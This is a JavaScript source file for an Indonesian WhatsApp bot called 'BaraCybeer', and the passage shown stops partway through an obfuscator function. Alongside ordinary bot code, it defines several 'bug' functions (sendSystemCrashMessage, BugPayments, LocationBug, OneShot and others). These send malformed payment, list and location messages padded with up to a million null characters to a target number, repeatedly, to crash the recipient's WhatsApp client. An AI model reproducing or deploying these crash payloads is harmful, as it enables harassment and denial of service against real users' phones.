/**
 * Script By BaraCybeer
 * Created On 20/9/2024
 * Contact Me on wa.me/6283896252486
 * Version 5.0.0 Gen 4

  SAYA ( BaraCybeer ) TIDAK BERTANGGUNG JAWAB JIKA SCRIPT INI DI SALAH GUNAKAN, DILARANG KERAS MENJUAL SCRIPT INI!!!
  KALAU MAU COLONG FITUR, MINIMAL MASUKIN NAMA GW DI TQTO KALIAN AJG

DAH ITU DARI GW AJA

TANKS TO FOR
 * 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 / Bara ( Developer )
 
Last Author : BaraCyber

Jangan Lupa Subscribe: https://youtube.com/@Baradeveloper_
*/

module.exports = async (BaraCybeer, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await BaraCybeer.decodeJid(BaraCybeer.user.id)
const sender = m.key.fromMe ? (BaraCybeer.user.id.split(':')[0]+'@s.whatsapp.net' || BaraCybeer.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await BaraCybeer.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { mediafireDl } = require('./all/database/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
const fakejpg = fs.readFileSync(`./src/BaraCyber.jpg`)
const { ios } = require("./virtex/ios.js")
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const hdztzy = fs.readFileSync(`./image/Bara999.jpg`)
const yaechan = fs.readFileSync(`./image/yaechan.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/BaraCyber.apk`)


// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return BaraCybeer.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('🔥 Ada pesan, Om'), color(`[ 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
// Batas Waktu
       
    BaraCybeer.autoshalat = BaraCybeer.autoshalat ? BaraCybeer.autoshalat : {}
    let id = m.chat
    if (id in BaraCybeer.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        BaraCybeer.autoshalat[id] = [
            BaraCybeer.sendMessage(m.chat, {
                audio: {
                    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
                },
                mimetype: 'audio/mp4',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        mediaType: 1,
                        mediaUrl: '',
                        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
                        body: `🕑 ${waktu}`,
                        sourceUrl: '',
                        thumbnail: await fs.readFileSync('./image/jdw.jpg'),
                        renderLargerThumbnail: true
                    }
                }
            }, {}),
            setTimeout(async () => {
                delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   BaraCybeer.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: BaraCybeer.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  header: {
                     hasMediaAttachment: true,
                     videoMessage: video.videoMessage,
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await BaraCybeer.sendPresenceUpdate('composing', jid)
      return BaraCybeer.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
// AREA CONST BUG HDZ TZY
const xbug2 = {

key: {

remoteJid: 'status@broadcast',

fromMe: false, 

participant: '0@s.whatsapp.net'

},

message: {

listResponseMessage: {

title: '𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥'

}

}

}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️᜴࿆͆᷍𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥╮⭑\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

async function sendPaymentInfoMessage(jid) {
            await BaraCybeer.relayMessage(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 0x2,
                                deviceListMetadata: {}
                            },
                            interactiveMessage: {
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "payment_info",
                                            buttonParamsJson: JSON.stringify({
                                                currency: "BRL",
                                                total_amount: { value: 0, offset: 100 },
                                                reference_id: "4P46GMY57GC",
                                                type: "physical-goods",
                                                order: {
                                                    status: "pending",
                                                    subtotal: { value: 0, offset: 100 },
                                                    order_type: "ORDER",
                                                    items: [
                                                        {
                                                            name: "",
                                                            amount: { value: 0, offset: 100 },
                                                            quantity: 0,
                                                            sale_amount: { value: 0, offset: 100 }
                                                        }
                                                    ]
                                                },
                                                payment_settings: [
                                                    {
                                                        type: "pix_static_code",
                                                        pix_static_code: {
                                                            merchant_name: "meu ovo",
                                                            key: "+6283896252486",
                                                            key_type: "X"
                                                        }
                                                    }
                                                ]
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                {
                    participant: { jid: jid }
                },
                { messageId: null }
            );
        }

async function sendSystemCrashMessage(jid) {
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
                                'subtitle': " "
                            },
                            'body': {
                                'text': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
                            },
                            'footer': {
                                'text': 'xp'
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': 'cta_url',
                                    'buttonParamsJson': "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
                                }],
                                'messageParamsJson': "\0".repeat(1000000)
                            }
                        }
                    }
                }
            }), {
                'userJid': jid
            });
            await BaraCybeer.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }

async function sendRepeatedMessages2(jid, count) {
            for (let i = 0; i < count; i++) {
                sendSystemCrashMessage(jid);
                sendSystemCrashMessage(jid);
                sendSystemCrashMessage(jid);
                await sleep(500);
            }
        }
        
async function BugPayments(jid) {
            const h = {
                product_header_info_id: 0x4433e2e130,
                product_header_is_rejected: false
            };
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'listMessage': {
                    'title': "가이 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬" + "\0".repeat(920000),
                    'footerText': "가이 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬☠️",
                    'description': "가이 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬☠️",
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': 'anjay',
                            'products': [{
                                'productId': "4392524570816732"
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': "4392524570816732",
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': "0@s.whatsapp.net"
                    }
                },
                'footer': "puki",
                'contextInfo': {
                    'expiration': 0x93a80,
                    'ephemeralSettingTimestamp': "1679959486",
                    'entryPointConversionSource': "global_search_new_chat",
                    'entryPointConversionApp': "whatsapp",
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': "INITIATED_BY_ME"
                    }
                },
                'selectListType': 0x2,
                'product_header_info': h
            }), {
                'userJid': jid,
                'quoted': m
            });
            await BaraCybeer.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }
async function ButtonWithImageBug(jid) {
            const upload = {
                upload: BaraCybeer.waUploadToServer
            };
            const text = {
                text: ''
            };
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'interactiveMessage': {
                    'header': {
                        'title': "𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬",
                        'hasMediaAttachment': true,
                        ...(await prepareWAMessageMedia({
                            'image': {
                                'url': "https://cdn.meitang.xyz/file/BQACAgUAAxkDAALlB2btl7EY10Hr49AwI2cr3uR4kDy4AAKSJQACii9oV3q_2BtVBw5fNgQ"
                            }
                        }, upload))
                    },
                    'body': text,
                    'footer': {
                        'text': "›          #BaraCybeerX"
                    },
                    'nativeFlowMessage': {
                        'messageParamsJson': "\0".repeat(1000000)
                    }
                }
            }), {
                'userJid': jid,
                'quoted': m
            });
            await BaraCybeer.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }
        async function LocationBug(jid) {
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': "𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬" + 'ꦾ'.repeat(50000),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': jid,
                'quoted': m
            });
            await BaraCybeer.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }
        
        async function stickerBug(jid) {
            const _0x3edf68 = {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp",
                directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
                fileLength: "10116",
                mediaKeyTimestamp: "1715876003",
                isAnimated: false,
                stickerSentTs: "1715881084144",
                isAvatar: false,
                isAiSticker: false,
                isLottie: false
            };
            const _0x5d903d = {
                stickerMessage: _0x3edf68
            };
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject(_0x5d903d), {
                'userJid': jid,
                'quoted': m
            });
            await BaraCybeer.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }
        async function OneShot(jid) {
            for (let jmlh = '3'; jmlh !== 0; jmlh -= 1) {
                await BaraCybeer.relayMessage(jid, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 0x2,
                                deviceListMetadata: {}
                            },
                            interactiveMessage: {
                                nativeFlowMessage: {
                                    'buttons': [{
                                        name: "payment_info",
                                        buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥\",\"key\":\"+6283896252486\",\"key_type\":\"X\"}}]}"
                                    }]
                                }
                            }
                        }
                    }
                }, {
                    'participant': {
                        'jid': jid
                    }
                }, {
                    messageId: null
                });
            }
            for (let jmlhh = '3'; jmlhh !== 0; jmlhh -= 1) {
                await BaraCybeer.relayMessage(jid, {
                    'viewOnceMessage': {
                        'message': {
                            'interactiveMessage': {
                                'header': {
                                    title: '',
                                    subtitle: " "
                                },
                                'body': {
                                    text: "𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬"
                                },
                                'footer': {
                                    text: 'xp'
                                },
                                'nativeFlowMessage': {
                                    'buttons': [{
                                        name: 'cta_url',
                                        buttonParamsJson: "{ display_text : 'B̸A꙰̸R꙰̸A꙰̸ 9̸9꙰̸̸9꙰̸꙰̸', url : '', merchant_url : '' }"
                                    }],
                                    'messageParamsJson': "\0".repeat(1000000)
                                }
                            }
                        }
                    }
                }, {
                    'participant': {
                        'jid': jid
                    }
                });
            }
        }
//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"᜴࿆͆᷍𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//
async function bughadzz(jid) {
var etc = generateWAMessageFromContent(Hadzz, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "› BaraCyber"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'BaraCyber', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await BaraCybeer.relayMessage(jid, etc.message, { messageId: etc.key.id })
}
//=================================================//

const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 BaraCyber Flient - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const hdzbug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `BaraCybeer`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'BaraCybeer',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const hdzcakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363321008297293@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` BaraCyber - Whatsapp \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}



const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ BaraCybeer𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `BaraCybeer`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ Bokep Mark 𒑊 ${m.body || m.mtype}`,
"description": `BaraCybeer`,
"currencyCode": "IDR",
"priceAmount1000": "10",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6283896252486-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const reactemoji = async text => {
     await BaraCybeer.sendMessage(m.chat, {
        'react': {
          'text': text,
          'key': m.key
        }
      });
    };

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}
/////// 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥
// ini vcard kalo di edit bakal error jangan kau edit.
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await BaraCybeer.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await BaraCybeer.getName(i + '@s.whatsapp.net')}\n
FN:${await BaraCybeer.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VafZAPi2ER6id5fxrC24
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await BaraCybeer.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
